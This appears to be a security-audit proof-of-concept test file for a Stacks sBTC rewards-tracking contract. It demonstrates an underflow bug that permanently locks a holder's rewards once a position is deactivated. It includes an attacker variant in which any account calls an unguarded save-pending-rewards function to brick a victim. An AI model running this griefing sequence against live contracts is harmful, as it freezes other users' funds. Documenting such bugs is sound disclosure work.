// PoC: Permanent freeze of accrued sBTC rewards for holders of a deactivated position.
//
// Bug: read-path get-pending-rewards uses the frozen `deactivated-cumm-reward`
// for a deactivated position, while write-path update-holder-position (called
// via save-pending-rewards / claim-pending-rewards / refresh-position) writes
// the holder's cumm-reward checkpoint to the LIVE global cumm-reward. Once
// global grows past deactivated, ANY post-deactivation save/claim/refresh
// makes the next get-pending-rewards subtract (frozen - live) and underflow
// the uint => Clarity runtime abort.
//
// Amplifier: save-pending-rewards has NO check-is-protocol guard (unlike
// refresh-wallet), so ANY account can brick ANY victim holder for a
// deactivated position — banking the victim's full pending into saved-rewards
// first (maximizing the locked amount) and then locking it forever.

import { describe, expect, it } from "vitest";
import { Cl, ClarityType, ClarityValue } from "@stacks/transactions";

import { tupleField, uintWithDecimals, qualifiedName } from "../wrappers/tests-utils";
import { SBtcToken } from "../wrappers/sbtc-token-helpers";
import { StStxBtcToken } from "../wrappers/ststxbtc-token-helpers";
import { StStxBtcTracking } from "../wrappers/ststxbtc-tracking-helpers";
import { StStxBtcTrackingData } from "../wrappers/ststxbtc-tracking-data-helpers";

const accounts = simnet.getAccounts();
const deployer = accounts.get("deployer")!;
const wallet_1 = accounts.get("wallet_1")!; // victim
const wallet_2 = accounts.get("wallet_2")!; // attacker
const wallet_3 = accounts.get("wallet_3")!; // active wallet (keeps accruing)

const POS = qualifiedName("position-mock");
const TRACKING = qualifiedName("ststxbtc-tracking-v2");

// Helper: invoke `get-pending-rewards` and return the ClarityValue result
// (or null if the call runtime-aborted, e.g. ArithmeticUnderflow).
function tryGetPendingRewards(holder: string, position: string): ClarityValue | null {
  try {
    return simnet.callReadOnlyFn(
      "ststxbtc-tracking-v2",
      "get-pending-rewards",
      [Cl.principal(holder), Cl.principal(position)],
      holder,
    ).result;
  } catch {
    return null;
  }
}

// Helper: invoke `claim-pending-rewards` and return the ClarityValue result
// (or null if the call runtime-aborted).
function tryClaimPendingRewards(
  caller: string,
  holder: string,
  position: string,
): ClarityValue | null {
  try {
    return simnet.callPublicFn(
      "ststxbtc-tracking-v2",
      "claim-pending-rewards",
      [Cl.principal(holder), Cl.principal(position)],
      caller,
    ).result;
  } catch {
    return null;
  }
}

describe("PoC: rewards-freeze on deactivated position", () => {
  it("reproduces the freeze end-to-end (attacker-driven)", () => {
    const sBtcToken = new SBtcToken(deployer);
    const stStxBtcToken = new StStxBtcToken(deployer);
    const stStxBtcTracking = new StStxBtcTracking(deployer);
    const stStxBtcTrackingData = new StStxBtcTrackingData(deployer);

    // ---- Setup: sBTC liquidity for rewards ----
    expect(sBtcToken.protocolMint(deployer, 100_000, deployer)).toBeOk(Cl.bool(true));

    // ---- Mint stSTXbtc to: victim (wallet_1) via position-mock, and to wallet_3 (active wallet) ----
    expect(stStxBtcToken.mintForProtocol(deployer, 1_000, POS)).toBeOk(Cl.bool(true));
    expect(stStxBtcToken.mintForProtocol(deployer, 1_000, wallet_3)).toBeOk(Cl.bool(true));

    // ---- Activate position-mock as a supported position ----
    expect(stStxBtcTracking.setSupportedPositions(deployer, POS, true, POS)).toBeOk(
      Cl.bool(true),
    );

    // ---- Refresh victim's position-mock entry (checkpoints at current global cumm = 0) ----
    expect(stStxBtcTracking.refreshPosition(deployer, wallet_1, POS)).toBeOk(
      uintWithDecimals(100), // mock returns 100 stSTXbtc for the holder
    );

    // ---- Stream rewards #1: global cumm grows from 0 to C_deact ----
    expect(stStxBtcTracking.addRewards(deployer, 300)).toBeOk(Cl.bool(true));

    // Snapshot victim's accrued pending BEFORE deactivation
    // victim held 100 of 2000 total = 5% => 5% of 300 sats = 15 sBTC (8-dec)
    expect(stStxBtcTracking.getPendingRewards(wallet_1, POS)).toBeOk(
      uintWithDecimals(15, 8),
    );

    // -----------------------------------------------------------------
    // DAO DEACTIVATES the position. deactivated-cumm-reward := global cumm.
    // -----------------------------------------------------------------
    expect(stStxBtcTracking.setSupportedPositions(deployer, POS, false, POS)).toBeOk(
      Cl.bool(true),
    );

    // Confirm deactivation wrote a non-zero deactivated-cumm-reward
    const supported = stStxBtcTrackingData.getSupportedPositions(POS);
    expect(tupleField(supported, "active")).toBeBool(false);
    const deactCumm = (tupleField(supported, "deactivated-cumm-reward") as any).value as bigint;
    expect(deactCumm > 0n).toBe(true);

    // -----------------------------------------------------------------
    // More rewards stream in for ACTIVE wallets. Global cumm grows past C_deact.
    // -----------------------------------------------------------------
    expect(stStxBtcTracking.addRewards(deployer, 300)).toBeOk(Cl.bool(true));

    const liveCumm = (stStxBtcTrackingData.getCummRewards() as any).value as bigint;
    expect(liveCumm > deactCumm).toBe(true); // <-- the divergence required for the bug

    // Sanity: victim's pending (read-path) is still well-defined using the
    // frozen deactivated-cumm-reward. NOT yet bricked.
    expect(stStxBtcTracking.getPendingRewards(wallet_1, POS)).toBeOk(
      uintWithDecimals(15, 8),
    );

    // -----------------------------------------------------------------
    // ATTACK: wallet_2 (anyone) calls unguarded save-pending-rewards
    // for the VICTIM. This banks the victim's full pending into
    // saved-rewards AND checkpoints the victim's cumm-reward to the
    // LIVE global cumm (via update-holder-position).
    // -----------------------------------------------------------------
    const attackResult = stStxBtcTracking.savePendingRewards(wallet_2, wallet_1, POS);
    expect(attackResult).toBeOk(uintWithDecimals(15, 8)); // banked 15 sBTC

    // saved-rewards now holds the victim's full accrued amount
    expect(stStxBtcTracking.getSavedRewards(wallet_1, POS)).toBeUint(
      uintWithDecimals(15, 8).value,
    );

    // Victim's checkpoint is now the LIVE global cumm (write-path bug)
    const victimInfo = stStxBtcTrackingData.getHolderPosition(wallet_1, POS);
    expect(tupleField(victimInfo, "cumm-reward")).toBeUint(liveCumm);
    expect(
      (tupleField(victimInfo, "cumm-reward") as any).value > deactCumm,
    ).toBe(true);

    // -----------------------------------------------------------------
    // BRICK: every read of get-pending-rewards(victim, POS) now ABORTS
    // because amount-owed-per-token = deactivated-cumm-reward (frozen)
    //                                            - victim.checkpoint (live)
    //                                          = deactCumm - liveCumm
    //                                          => uint underflow => panic.
    // -----------------------------------------------------------------
    const readAfter = tryGetPendingRewards(wallet_1, POS);
    expect(readAfter).toBeNull(); // runtime abort (ArithmeticUnderflow)

    // -----------------------------------------------------------------
    // CLAIM FAILS: claim-pending-rewards unwrap-panics on get-pending-rewards
    // => transaction aborts. Victim's banked 15 sBTC is unreachable.
    // -----------------------------------------------------------------
    const claimRes = tryClaimPendingRewards(wallet_1, wallet_1, POS);
    expect(claimRes).toBeNull(); // runtime abort

    // The contract still holds the banked sBTC.
    expect(sBtcToken.getBalance(TRACKING)).toBeOk(uintWithDecimals(600, 8));

    // And the saved-rewards entry still says victim is owed 15 sBTC...
    expect(stStxBtcTracking.getSavedRewards(wallet_1, POS)).toBeUint(
      uintWithDecimals(15, 8).value,
    );
    // ...but the victim can NEVER claim it through the public interface.
  });

  it("self-brick: even without an attacker, the victim's own claim bricks the entry", () => {
    // Demonstrates that the read/write cumm-reward mismatch alone (independent
    // of the unguarded save-pending-rewards amplifier) is sufficient to brick
    // a holder who simply claims AFTER post-deactivation add-rewards.
    const sBtcToken = new SBtcToken(deployer);
    const stStxBtcToken = new StStxBtcToken(deployer);
    const stStxBtcTracking = new StStxBtcTracking(deployer);
    const stStxBtcTrackingData = new StStxBtcTrackingData(deployer);

    expect(sBtcToken.protocolMint(deployer, 100_000, deployer)).toBeOk(Cl.bool(true));
    expect(stStxBtcToken.mintForProtocol(deployer, 1_000, POS)).toBeOk(Cl.bool(true));
    expect(stStxBtcToken.mintForProtocol(deployer, 1_000, wallet_3)).toBeOk(Cl.bool(true));

    expect(stStxBtcTracking.setSupportedPositions(deployer, POS, true, POS)).toBeOk(
      Cl.bool(true),
    );
    expect(stStxBtcTracking.refreshPosition(deployer, wallet_1, POS)).toBeOk(
      uintWithDecimals(100),
    );
    // global -> C_deact (150_000_000_000)
    expect(stStxBtcTracking.addRewards(deployer, 300)).toBeOk(Cl.bool(true));

    // DAO deactivates; deactivated-cumm-reward := global = C_deact
    expect(stStxBtcTracking.setSupportedPositions(deployer, POS, false, POS)).toBeOk(
      Cl.bool(true),
    );
    const deactCumm = (tupleField(
      stStxBtcTrackingData.getSupportedPositions(POS),
      "deactivated-cumm-reward",
    ) as any).value as bigint;

    // More rewards stream in for active wallets => global > deactCumm.
    expect(stStxBtcTracking.addRewards(deployer, 300)).toBeOk(Cl.bool(true));
    const liveCumm = (stStxBtcTrackingData.getCummRewards() as any).value as bigint;
    expect(liveCumm > deactCumm).toBe(true);

    // Victim tries to claim AFTER post-deactivation add-rewards.
    // claim-pending-rewards -> get-pending-rewards:
    //   amount-owed-per-token = deactCumm - victim.checkpoint
    //   victim.checkpoint is still C_old (=0), so this DOES succeed,
    //   BUT claim-pending-rewards then calls update-holder-position which
    //   bumps victim.checkpoint to liveCumm (> deactCumm).
    expect(stStxBtcTracking.claimPendingRewards(wallet_1, wallet_1, POS)).toBeOk(
      uintWithDecimals(15, 8),
    );

    // After that single claim, the entry is poisoned: every subsequent
    // get-pending-rewards aborts (deactCumm - liveCumm underflow).
    expect(tryGetPendingRewards(wallet_1, POS)).toBeNull();

    // And the second claim also aborts.
    expect(tryClaimPendingRewards(wallet_1, wallet_1, POS)).toBeNull();
  });

  it("control: a never-deactivated position does NOT brick", () => {
    // Negative control — proves the bug is gated by deactivation, not by
    // the save/claim cycle in general. The same exact sequence on an
    // ACTIVE position leaves the holder claimable forever.
    const sBtcToken = new SBtcToken(deployer);
    const stStxBtcToken = new StStxBtcToken(deployer);
    const stStxBtcTracking = new StStxBtcTracking(deployer);

    expect(sBtcToken.protocolMint(deployer, 100_000, deployer)).toBeOk(Cl.bool(true));
    expect(stStxBtcToken.mintForProtocol(deployer, 1_000, POS)).toBeOk(Cl.bool(true));
    expect(stStxBtcToken.mintForProtocol(deployer, 1_000, wallet_3)).toBeOk(Cl.bool(true));

    expect(stStxBtcTracking.setSupportedPositions(deployer, POS, true, POS)).toBeOk(
      Cl.bool(true),
    );
    expect(stStxBtcTracking.refreshPosition(deployer, wallet_1, POS)).toBeOk(
      uintWithDecimals(100),
    );
    expect(stStxBtcTracking.addRewards(deployer, 300)).toBeOk(Cl.bool(true));

    // NO deactivation here.
    expect(stStxBtcTracking.savePendingRewards(wallet_2, wallet_1, POS)).toBeOk(
      uintWithDecimals(15, 8),
    );
    // Second addRewards: global grows further. For ACTIVE positions, the read
    // path uses global too, so amount-owed = global - checkpoint = 0 (since
    // save-pending-rewards just checkpointed to global). Pending = 0.
    expect(stStxBtcTracking.addRewards(deployer, 300)).toBeOk(Cl.bool(true));

    // Read is still a valid (ok ...) — read & write cumm-reward are the SAME
    // (both the live global) for active positions, so no underflow.
    const r = tryGetPendingRewards(wallet_1, POS);
    expect(r).not.toBeNull();
    expect(r!.type).toBe(ClarityType.ResponseOk);

    // saved-rewards still has the 15 sBTC banked from earlier, plus 15 more
    // sats accrued since the second addRewards (checkpoint was bumped to
    // 150e9 by savePendingRewards; second addRewards took global to 300e9;
    // delta => 15 more sats). Total pending = 30 sats. The KEY point is the
    // claim SUCCEEDS — no brick.
    expect(stStxBtcTracking.claimPendingRewards(wallet_1, wallet_1, POS)).toBeOk(
      uintWithDecimals(30, 8),
    );

    // And after the claim, the holder can STILL read pending (returns 0).
    const r2 = tryGetPendingRewards(wallet_1, POS);
    expect(r2).not.toBeNull();
    expect(r2!.type).toBe(ClarityType.ResponseOk);
  });
});
